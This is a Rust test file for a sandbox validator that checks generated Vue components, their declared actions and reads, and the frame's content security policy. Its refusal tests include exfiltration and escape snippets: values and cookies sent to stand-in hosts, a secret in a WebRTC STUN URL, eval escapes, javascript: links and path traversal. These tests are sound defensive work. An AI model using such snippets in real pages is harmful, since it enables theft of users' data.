/*
 * This software is in the public domain under CC0 1.0 Universal plus a
 * Grant of Patent License.
 *
 * To the extent possible under law, the author(s) have dedicated all
 * copyright and related and neighboring rights to this software to the
 * public domain worldwide. This software is distributed without any
 * warranty.
 *
 * You should have received a copy of the CC0 Public Domain Dedication
 * along with this software (see the LICENSE.md file). If not, see
 * <http://creativecommons.org/publicdomain/zero/1.0/>.
 */

//! The Vue SFC checks: the blocks and a patch's merge, the sandbox's refusals with their sections, the actions and the
//! request an action makes, the skill quoting every rule, the frame document's policy and the reported problems.

use serde_json::json;

use super::*;

fn compiler() -> String {
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../runtime/base-component/webroot/screen/webroot/libs/vue/compiler-dom.cjs.js");
    std::fs::read_to_string(path).unwrap()
}

const GOOD: &str = r#"<template>
  <div class="q-pa-sm">
    <q-table :rows="rows" :columns="columns" row-key="_id" dense flat></q-table>
    <m-text-line dense outlined label="Description" v-model="description"></m-text-line>
    <template v-if="rows.length"><a href="/apps/system/Security/UserGroup/UserGroupList">All groups</a></template>
    <q-btn label="Save" color="primary" @click="save"></q-btn>
  </div>
</template>

<script>
module.exports = {
  props: { values: Object },
  data: function () { return { rows: [], description: '', columns: [{ name: 'g', label: 'Group', field: 'userGroupId' }] }; },
  mounted: function () {
    var vm = this;
    // a row's location is a field, not the frame's
    this.$bridge.get('/apps/system/Security/UserGroup/UserGroupList', { pageSize: '20' })
      .then(function (r) { vm.rows = (r.rows || []).filter(function (row) { return row.location !== 'window'; }); });
  },
  methods: { save: function () { this.$bridge.submit('save', { description: this.description }); } }
};
</script>

<style>
.q-table { max-height: 300px; background: url("data:image/png;base64,AAAA"); }
</style>

<actions>
[{"name": "save", "label": "Save the group", "path": "/apps/system/Security/UserGroup/UserGroupDetail/updateUserGroup",
  "fields": ["description"], "parameters": {"userGroupId": "ADMIN"}}]
</actions>

<reads>
["/apps/system/Security/UserGroup/UserGroupList"]
</reads>
"#;

fn sections(problems: &[Problem]) -> Vec<String> {
    problems
        .iter()
        .map(|problem| problem.rule.section.to_string())
        .collect()
}

fn problems_of(program: &str) -> Vec<Problem> {
    match prepared(
        None,
        &WriteInput {
            program: Some(program.to_string()),
            ..WriteInput::default()
        },
        Some(&compiler()),
    ) {
        Ok(_) => Vec::new(),
        Err(problems) => problems,
    }
}

#[test]
fn a_component_checks_and_is_kept_with_its_blocks_and_actions() {
    let prepared = prepared(
        None,
        &WriteInput {
            program: Some(GOOD.to_string()),
            ..WriteInput::default()
        },
        Some(&compiler()),
    )
    .unwrap();
    assert_eq!(prepared.statements, ["template", "script", "style", "actions", "reads"]);
    assert_eq!(prepared.mutations, ["save"]);
    assert_eq!(prepared.reads, ["/apps/system/Security/UserGroup/UserGroupList"]);
    // the nested <template v-if> is the template's own
    let blocks = blocks(&prepared.program).unwrap();
    assert!(blocks
        .template
        .as_deref()
        .unwrap()
        .contains("<template v-if=\"rows.length\">"));
    assert!(prepared.program.starts_with("<template>\n  <div class=\"q-pa-sm\">"));
    // written back the same: the stored program checks again unchanged
    assert_eq!(blocks.text(), prepared.program);

    // a patch replaces the blocks it has and keeps the others
    let patch = "<style>\n.q-table { max-height: 400px; }\n</style>";
    let patched = super::prepared(
        Some(&prepared.program),
        &WriteInput {
            patch: Some(patch.to_string()),
            ..WriteInput::default()
        },
        Some(&compiler()),
    )
    .unwrap();
    assert!(patched.program.contains("max-height: 400px") && patched.program.contains("module.exports"));
    assert_eq!(patched.mutations, ["save"]);
}

#[test]
fn the_shape_of_a_program_is_checked_first() {
    let shape = |program: &str| {
        blocks(program)
            .err()
            .map(|problem| (problem.rule.section, problem.message))
    };
    assert_eq!(shape("<div>no blocks</div>").unwrap().0, "shape");
    assert!(shape("<script>module.exports = {}</script>")
        .unwrap()
        .1
        .contains("no <template>"));
    assert!(shape("<template><div></div></template><template><b></b></template>")
        .unwrap()
        .1
        .contains("second <template>"));
    assert!(shape("<template><div>").unwrap().1.contains("has no </template>"));
    assert_eq!(
        shape("<template><div></div></template><script setup>const a = 1</script>")
            .unwrap()
            .0,
        "shape"
    );
    assert!(shape("<!-- a note --><template><div></div></template>").is_none());
    // a script that does not compile or does not export, and an export default
    assert_eq!(
        sections(&problems_of(
            "<template><div></div></template><script>module.exports = { data( {</script>"
        )),
        ["shape"]
    );
    assert!(
        problems_of("<template><div></div></template><script>var a = 1;</script>")[0]
            .message
            .contains("module.exports")
    );
    let exported =
        problems_of("<template><div></div></template><script>export default { data() { return {} } }</script>");
    assert!(
        exported.iter().any(|problem| problem.message.contains("export")),
        "{exported:?}"
    );
    // a template that does not compile names its line
    let broken = problems_of("<template>\n<div>\n<span v-if=\"\"></span>\n</div>\n</template>");
    assert_eq!(sections(&broken), ["shape"], "{broken:?}");
    assert_eq!(broken[0].rule.text, TEMPLATE.text);
    let long = format!("<template><div>{}</div></template>", "x".repeat(MAX_PROGRAM_CHARS));
    assert!(problems_of(&long)[0].message.contains("longer than"));
}

#[test]
fn what_the_sandbox_does_not_have_is_refused_with_its_section() {
    let script = |code: &str| {
        format!("<template><div></div></template><script>module.exports = {{ mounted() {{ {code} }} }};</script>")
    };
    for code in [
        "fetch('/apps/x')",
        "new XMLHttpRequest()",
        "location.href = 'https://x/?d=' + this.values.a",
        "window.top.location = '/'",
        "eval('1')",
        "new Function('return 1')()",
        "this.$el.ownerDocument.title",
        "(function(){}).constructor('return this')()",
        "navigator.sendBeacon('/x')",
        "localStorage.setItem('a', 1)",
        "this.$el.innerHTML = this.values.a",
        "self.fetch('/x')",
        "top.location = '/'",
        "parent.postMessage('x', '*')",
        "new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + vm.secret }] })",
        "new webkitRTCPeerConnection()",
    ] {
        let problems = problems_of(&script(code));
        assert_eq!(
            sections(&problems).first().map(String::as_str),
            Some("sandbox"),
            "{code}: {problems:?}"
        );
        assert_eq!(problems[0].statement.as_deref(), Some("script"));
    }
    // a name in a string, a comment, a property or a key is not the frame's
    let fine = script("var a = { location: 'window' }; /* fetch */ var b = this.values.location; // document\nvar c = `x ${a.location} document`;");
    assert!(problems_of(&fine).is_empty(), "{:?}", problems_of(&fine));
    let in_template = script("1");
    assert!(problems_of(&in_template).is_empty());
    // the template: elements and attributes that load, post or run, expressions, and the widgets
    for (template, section) in [
        ("<div><script>alert(1)</script></div>", "sandbox"),
        ("<div><iframe src=\"https://x\"></iframe></div>", "sandbox"),
        ("<div><form action=\"/x\"><input></form></div>", "sandbox"),
        (
            "<div><meta http-equiv=\"refresh\" content=\"0;url=https://x\"></div>",
            "sandbox",
        ),
        ("<div v-html=\"values.a\"></div>", "sandbox"),
        ("<div><a href=\" javascript:alert(1)\">x</a></div>", "sandbox"),
        (
            "<div><a :href=\"'https://x/?d=' + $el.ownerDocument.cookie\">x</a></div>",
            "sandbox",
        ),
        ("<div>{{ $el.ownerDocument.defaultView.location }}</div>", "sandbox"),
        ("<div><m-form-list></m-form-list></div>", "widgets"),
        ("<div><router-link to=\"/x\">x</router-link></div>", "widgets"),
        ("<div><a href=\"//evil.example.com/x\">x</a></div>", "bridge"),
    ] {
        let problems = problems_of(&format!("<template>{template}</template>"));
        assert_eq!(
            sections(&problems).first().map(String::as_str),
            Some(section),
            "{template}: {problems:?}"
        );
    }
    // the words in the text of the template are the user's to read, and a free name in a binding is the component's own
    assert!(problems_of("<template><div>Open the window and fetch the document</div></template>").is_empty());
    assert!(
        problems_of("<template><div v-show=\"open\" @click=\"open = !open\">{{ location }}</div></template>")
            .is_empty()
    );
    let idiom = "<template><div></div></template><script>module.exports = { methods: { open() { var vm = this; vm.shown = true; } } };</script>";
    assert!(problems_of(idiom).is_empty(), "{:?}", problems_of(idiom));
    // self, top and parent are banned too (defence in depth; the frame is the boundary)
    for name in ["self", "top", "parent", "RTCPeerConnection"] {
        let code = format!(
            "<template><div></div></template><script>module.exports = {{ mounted() {{ var x = {name}; }} }};</script>"
        );
        assert_eq!(
            sections(&problems_of(&code)).first().map(String::as_str),
            Some("sandbox"),
            "{name}"
        );
    }
    // a style that loads
    for style in [
        "@import url('https://x/a.css');",
        ".a { background: url(https://x/p.png?d=1) }",
    ] {
        let problems = problems_of(&format!("<template><div></div></template><style>{style}</style>"));
        assert_eq!(problems[0].rule.text, STYLE.text, "{style}");
    }
}

#[test]
fn actions_are_checked_and_an_action_makes_its_request_from_the_values() {
    let with_actions =
        |actions: &str| problems_of(&format!("<template><div></div></template><actions>{actions}</actions>"));
    for (actions, why) in [
        ("{\"name\": \"a\"}", "not a JSON list"),
        ("[{\"name\": \"a b\", \"path\": \"/apps/x/y\"}]", "not a plain name"),
        ("[{\"name\": \"a\", \"path\": \"https://x/y\"}]", "not a transition"),
        (
            "[{\"name\": \"a\", \"path\": \"/apps/x/y\", \"method\": \"GET\"}]",
            "writes with POST",
        ),
        (
            "[{\"name\": \"a\", \"path\": \"/apps/x/y\", \"fields\": [\"currentPassword\"]}]",
            "a secret",
        ),
        (
            "[{\"name\": \"a\", \"path\": \"/apps/x/y\", \"parameters\": {\"b\": {\"c\": 1}}}]",
            "not a plain value",
        ),
        (
            "[{\"name\": \"a\", \"path\": \"/apps/x/y\"}, {\"name\": \"a\", \"path\": \"/apps/x/z\"}]",
            "two actions",
        ),
        (
            "[{\"name\": \"a\", \"path\": \"/apps/x/y\", \"run\": \"z\"}]",
            "does not take",
        ),
    ] {
        let problems = with_actions(actions);
        assert_eq!(
            problems.first().map(|problem| problem.rule.text),
            Some(ACTIONS.text),
            "{actions}"
        );
        assert!(problems[0].message.contains(why), "{actions}: {}", problems[0].message);
    }
    // a submit of an action that is not declared
    let undeclared =
        problems_of("<template><div><q-btn @click=\"$bridge.submit('send', {})\"></q-btn></div></template>");
    assert_eq!(undeclared[0].rule.text, WRITES.text);
    let unknown = problems_of(
        "<template><div></div></template><script>module.exports = { methods: { s() { this.$bridge.submit('sav', {}) } } }</script>\
         <actions>[{\"name\": \"save\", \"path\": \"/apps/x/y\"}]</actions>",
    );
    assert_eq!(unknown[0].did_you_mean, ["save"]);

    // the request: the fixed parameters and the named fields from the values, nothing else; a missing field is null
    let state = json!({"description": "New", "other": "not sent"});
    let (method, path, body) = action_request(GOOD, "save", &state).unwrap().unwrap();
    assert_eq!(method, "POST");
    assert_eq!(path, "/apps/system/Security/UserGroup/UserGroupDetail/updateUserGroup");
    assert_eq!(body, json!({"userGroupId": "ADMIN", "description": "New"}));
    let (_, _, body) = action_request(GOOD, "save", &json!({})).unwrap().unwrap();
    assert_eq!(body, json!({"userGroupId": "ADMIN", "description": null}));
    assert_eq!(action_request(GOOD, "delete", &state).unwrap(), None);
}

#[test]
fn the_reads_block_is_checked_and_decides_what_the_proxy_answers() {
    let with_reads = |reads: &str| problems_of(&format!("<template><div></div></template><reads>{reads}</reads>"));
    assert!(with_reads("[\"/apps/system/Security/UserGroup/UserGroupList\"]").is_empty());
    assert!(with_reads("[{\"path\": \"/qapps/system/Visit/VisitList\"}]").is_empty());
    for (reads, why) in [
        ("{\"path\": \"/apps/x/y\"}", "not a JSON list"),
        ("[\"https://evil.example.com/x\"]", "not an /apps screen path"),
        ("[\"/apps/../etc\"]", "not an /apps screen path"),
        ("[5]", "not a path"),
    ] {
        let problems = with_reads(reads);
        assert_eq!(
            problems.first().map(|problem| problem.rule.text),
            Some(READS.text),
            "{reads}"
        );
        assert!(problems[0].message.contains(why), "{reads}: {}", problems[0].message);
    }
    // the prepared canvas carries the declared reads, and the proxy answers only those (the /qapps twin as /apps)
    let declared = parse_reads("[\"/apps/system/Security/UserGroup/UserGroupList\"]").unwrap();
    assert!(read_declared(
        &declared,
        "/apps/system/Security/UserGroup/UserGroupList"
    ));
    assert!(read_declared(
        &declared,
        "/qapps/system/Security/UserGroup/UserGroupList?userGroupId=ADMIN"
    ));
    assert!(!read_declared(
        &declared,
        "/apps/system/Security/UserAccount/UserAccountList"
    ));
    assert!(!read_declared(&[], "/apps/x/y"));
    // only fixed-code reasons auto-revalidate; a free-text runtime error, a read or link refusal does not
    assert!(
        auto_revalidates("compile", "template")
            && auto_revalidates("compile", "script")
            && auto_revalidates("sandbox", "navigation")
    );
    assert!(
        !auto_revalidates("runtime", "error")
            && !auto_revalidates("read", "refused")
            && !auto_revalidates("link", "external")
    );
}

/// The skill file's sections by slug.
fn skill_sections() -> std::collections::BTreeMap<String, String> {
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../runtime/base-component/framework/skill/vue-sfc.md");
    let text = std::fs::read_to_string(path).unwrap();
    let mut out = std::collections::BTreeMap::new();
    let mut current: Option<String> = None;
    let mut fenced = false;
    for line in text.lines() {
        if line.starts_with("```") {
            fenced = !fenced;
        }
        if !fenced {
            if let Some(title) = line.strip_prefix("## ") {
                current = Some(title.trim().to_lowercase().replace(' ', "-"));
                continue;
            }
        }
        if let Some(slug) = &current {
            out.entry(slug.clone())
                .or_insert_with(String::new)
                .push_str(&format!("{line}\n"));
        }
    }
    out
}

#[test]
fn every_rule_is_quoted_in_its_section_and_the_example_checks() {
    let sections = skill_sections();
    for rule in RULES {
        let text = sections
            .get(rule.section)
            .unwrap_or_else(|| panic!("the skill has no section {}", rule.section));
        assert!(
            text.contains(rule.text),
            "section {} does not quote: {}",
            rule.section,
            rule.text
        );
    }
    for widget in WIDGET_NAMES {
        assert!(sections["widgets"].contains(widget), "{widget}");
    }
    // the example is a program that checks
    let example = &sections["example"];
    let start = example.find("```\n").unwrap() + 4;
    let end = start + example[start..].find("```").unwrap();
    let program = &example[start..end];
    assert!(problems_of(program).is_empty(), "{:?}", problems_of(program));
}

#[test]
fn the_errors_name_the_section_and_the_reported_problems_map_to_theirs() {
    let problems =
        problems_of("<template><div></div></template><script>module.exports = { mounted() { fetch('/x') } };</script>");
    let error: serde_json::Value = serde_json::from_str(&error_json(&problems, false)).unwrap();
    assert_eq!(error["error"], json!("vue_sfc_invalid"));
    assert_eq!(error["skill"], json!("vue-sfc#sandbox"));
    assert_eq!(error["rule"], json!(SANDBOX.text));
    assert_eq!(error["block"], json!("script"));
    assert_eq!(error["line"], json!(1));
    assert!(error["instruction"]
        .as_str()
        .unwrap()
        .contains("Fix line 1 of the <script> and send the whole program again."));
    for (source, code, section) in [
        ("sandbox", "navigation", "sandbox"),
        ("compile", "template", "shape"),
        ("runtime", "error", "shape"),
        ("runtime", "component", "widgets"),
        ("read", "refused", "bridge"),
        ("link", "external", "bridge"),
    ] {
        assert_eq!(
            reported(source, code, "x", None).rule.section,
            section,
            "{source} {code}"
        );
    }
    assert_eq!(
        reported("sandbox", "navigation", "left", None).skill(),
        "vue-sfc#sandbox"
    );
}

#[test]
fn the_frame_document_loads_only_the_runtime_and_has_no_network() {
    let document = frame_document("http://localhost:8080", "3.1<script>", false);
    assert!(
        document
            .html
            .contains("<script src=\"/libs/vue/vue.global.prod.js?v=3.1script\"></script>"),
        "{}",
        document.html
    );
    assert!(document.html.contains("/js/WebrootAssistSandbox.js?v=3.1script"));
    assert_eq!(
        document.html.matches("<script").count(),
        3,
        "no inline script: the nonce comes in the frame's URL fragment"
    );
    assert!(document.csp.starts_with("sandbox allow-scripts; default-src 'none';"));
    assert!(document.csp.contains("connect-src 'none'") && document.csp.contains("form-action 'none'"));
    assert!(!document.csp.contains("https:"), "{}", document.csp);
    assert!(frame_document("http://localhost:8080", "", true)
        .csp
        .contains(" https:;"));
    assert!(plain_origin("https://moqui.example.com:8443") && plain_origin("http://[::1]:8080"));
    assert!(!plain_origin("https://x; script-src *") && !plain_origin("javascript:x") && !plain_origin("https://"));
}
